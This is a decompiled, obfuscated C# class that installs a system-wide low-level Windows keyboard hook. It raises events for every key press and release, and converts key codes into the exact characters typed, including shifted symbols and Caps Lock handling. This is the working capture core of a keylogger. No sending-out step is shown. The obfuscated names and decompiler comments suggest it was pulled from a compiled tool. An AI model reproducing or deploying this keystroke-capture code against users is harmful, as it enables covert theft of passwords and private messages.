using System;
using System.Diagnostics;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Windows.Forms;

public sealed class GClass0
{
	private struct Struct0
	{
		public int int_0;

		public int int_1;

		public int int_2;

		public int int_3;

		public int int_4;
	}

	private delegate int Delegate0(int int_0, int int_1, ref Struct0 struct0_0);

	public delegate void GDelegate0(Keys keys_0);

	public delegate void GDelegate1();

	public delegate void GDelegate2(Keys keys_0);

	private static GDelegate0 gdelegate0_0;

	private static GDelegate2 gdelegate2_0;

	private static GDelegate1 gdelegate1_0;

	private static int int_0;

	private static Delegate0 delegate0_0;

	[DebuggerNonUserCode]
	public GClass0()
	{
	}

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int SetWindowsHookExA(int int_1, Delegate0 delegate0_1, int int_2, int int_3);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int CallNextHookEx(int int_1, int int_2, int int_3, Struct0 struct0_0);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int UnhookWindowsHookEx(int int_1);

	[MethodImpl(MethodImplOptions.Synchronized)]
	[DebuggerNonUserCode]
	public static void smethod_0(GDelegate0 gdelegate0_1)
	{
		gdelegate0_0 = (GDelegate0)Delegate.Combine(gdelegate0_0, gdelegate0_1);
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[DebuggerNonUserCode]
	public static void smethod_1(GDelegate0 gdelegate0_1)
	{
		gdelegate0_0 = (GDelegate0)Delegate.Remove(gdelegate0_0, gdelegate0_1);
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[DebuggerNonUserCode]
	public static void smethod_2(GDelegate2 gdelegate2_1)
	{
		gdelegate2_0 = (GDelegate2)Delegate.Combine(gdelegate2_0, gdelegate2_1);
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[DebuggerNonUserCode]
	public static void smethod_3(GDelegate2 gdelegate2_1)
	{
		gdelegate2_0 = (GDelegate2)Delegate.Remove(gdelegate2_0, gdelegate2_1);
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[DebuggerNonUserCode]
	public static void smethod_4(GDelegate1 gdelegate1_1)
	{
		gdelegate1_0 = (GDelegate1)Delegate.Combine(gdelegate1_0, gdelegate1_1);
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[DebuggerNonUserCode]
	public static void smethod_5(GDelegate1 gdelegate1_1)
	{
		gdelegate1_0 = (GDelegate1)Delegate.Remove(gdelegate1_0, gdelegate1_1);
	}

	public void method_0()
	{
		delegate0_0 = method_1;
		int_0 = SetWindowsHookExA(13, delegate0_0, Marshal.GetHINSTANCE(Assembly.GetExecutingAssembly().GetModules()[0]).ToInt32(), 0);
	}

	private int method_1(int int_1, int int_2, ref Struct0 struct0_0)
	{
		if (int_1 == 0)
		{
			switch (int_2)
			{
			case 256:
			case 260:
				gdelegate0_0?.Invoke((Keys)struct0_0.int_0);
				break;
			case 257:
			case 261:
				gdelegate2_0?.Invoke((Keys)struct0_0.int_0);
				break;
			}
		}
		return CallNextHookEx(int_0, int_1, int_2, struct0_0);
	}

	public void method_2()
	{
		UnhookWindowsHookEx(int_0);
		base.Finalize();
	}

	public string method_3(Keys keys_0)
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0005: Invalid comparison between Unknown and I4
		//IL_0007: Unknown result type (might be due to invalid IL or missing references)
		//IL_000a: Invalid comparison between Unknown and I4
		//IL_0015: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Unknown result type (might be due to invalid IL or missing references)
		//IL_002b: Unknown result type (might be due to invalid IL or missing references)
		//IL_002d: Invalid comparison between Unknown and I4
		//IL_002f: Unknown result type (might be due to invalid IL or missing references)
		//IL_003b: Unknown result type (might be due to invalid IL or missing references)
		//IL_004c: Unknown result type (might be due to invalid IL or missing references)
		//IL_004f: Invalid comparison between Unknown and I4
		//IL_0054: Unknown result type (might be due to invalid IL or missing references)
		//IL_0057: Invalid comparison between Unknown and I4
		//IL_005c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0066: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Invalid comparison between Unknown and I4
		//IL_006d: Unknown result type (might be due to invalid IL or missing references)
		//IL_014e: Unknown result type (might be due to invalid IL or missing references)
		//IL_016d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0170: Invalid comparison between Unknown and I4
		//IL_0172: Unknown result type (might be due to invalid IL or missing references)
		//IL_0175: Invalid comparison between Unknown and I4
		//IL_0177: Unknown result type (might be due to invalid IL or missing references)
		//IL_0196: Unknown result type (might be due to invalid IL or missing references)
		//IL_0199: Invalid comparison between Unknown and I4
		//IL_019e: Unknown result type (might be due to invalid IL or missing references)
		//IL_01a1: Invalid comparison between Unknown and I4
		//IL_01a3: Unknown result type (might be due to invalid IL or missing references)
		//IL_0221: Unknown result type (might be due to invalid IL or missing references)
		//IL_0224: Invalid comparison between Unknown and I4
		//IL_022c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0232: Invalid comparison between Unknown and I4
		//IL_0237: Unknown result type (might be due to invalid IL or missing references)
		//IL_023d: Invalid comparison between Unknown and I4
		//IL_0242: Unknown result type (might be due to invalid IL or missing references)
		//IL_024c: Unknown result type (might be due to invalid IL or missing references)
		//IL_024e: Invalid comparison between Unknown and I4
		//IL_0253: Unknown result type (might be due to invalid IL or missing references)
		//IL_0355: Unknown result type (might be due to invalid IL or missing references)
		//IL_0456: Unknown result type (might be due to invalid IL or missing references)
		//IL_0459: Invalid comparison between Unknown and I4
		//IL_0466: Unknown result type (might be due to invalid IL or missing references)
		if ((int)keys_0 >= 65 && (int)keys_0 <= 90)
		{
			if (Control.IsKeyLocked((Keys)20))
			{
				return ((Enum)keys_0).ToString();
			}
			if ((Control.get_ModifierKeys() & 0x10000) != 0)
			{
				return ((Enum)keys_0).ToString();
			}
			return ((Enum)keys_0).ToString().ToLower();
		}
		if ((int)keys_0 >= 48 && (int)keys_0 <= 57)
		{
			if ((Control.get_ModifierKeys() & 0x10000) == 0)
			{
				string text = ((Enum)keys_0).ToString();
				return text.Replace("D", string.Empty);
			}
			switch (((Enum)keys_0).ToString())
			{
			case "D1":
				return "!";
			case "D2":
				return "@";
			case "D3":
				return "#";
			case "D4":
				return "$";
			case "D5":
				return "%";
			case "D6":
				return "^";
			case "D7":
				return "&";
			case "D8":
				return "*";
			case "D9":
				return "(";
			case "D0":
				return ")";
			}
		}
		else
		{
			if ((int)keys_0 >= 96 && (int)keys_0 <= 105)
			{
				string text2 = ((Enum)keys_0).ToString();
				return text2.Replace("NumPad", string.Empty);
			}
			if ((int)keys_0 >= 106 && (int)keys_0 <= 111)
			{
				switch (((Enum)keys_0).ToString())
				{
				case "Divide":
					return "/";
				case "Multiply":
					return "*";
				case "Subtract":
					return "-";
				case "Add":
					return "+";
				case "Decimal":
					return ".";
				}
			}
			else
			{
				if ((int)keys_0 == 32)
				{
					return " ";
				}
				if ((int)keys_0 < 186 || (int)keys_0 > 222)
				{
					if ((int)keys_0 == 13)
					{
						return "\r\n";
					}
					return "<" + ((Enum)keys_0).ToString() + ">";
				}
				if ((Control.get_ModifierKeys() & 0x10000) != 0)
				{
					switch (((Enum)keys_0).ToString())
					{
					case "OemMinus":
						return "_";
					case "Oemplus":
						return "+";
					case "OemOpenBrackets":
						return "{";
					case "Oem6":
						return "}";
					case "Oem5":
						return "|";
					case "Oem1":
						return ":";
					case "Oem7":
						return "\"";
					case "Oemcomma":
						return "<";
					case "OemPeriod":
						return ">";
					case "OemQuestion":
						return "?";
					case "Oemtilde":
						return "~";
					}
				}
				else
				{
					switch (((Enum)keys_0).ToString())
					{
					case "OemMinus":
						return "-";
					case "Oemplus":
						return "=";
					case "OemOpenBrackets":
						return "[";
					case "Oem6":
						return "]";
					case "Oem5":
						return "\\";
					case "Oem1":
						return ";";
					case "Oem7":
						return "'";
					case "Oemcomma":
						return ",";
					case "OemPeriod":
						return ".";
					case "OemQuestion":
						return "/";
					case "Oemtilde":
						return "`";
					}
				}
			}
		}
		return null;
	}
}
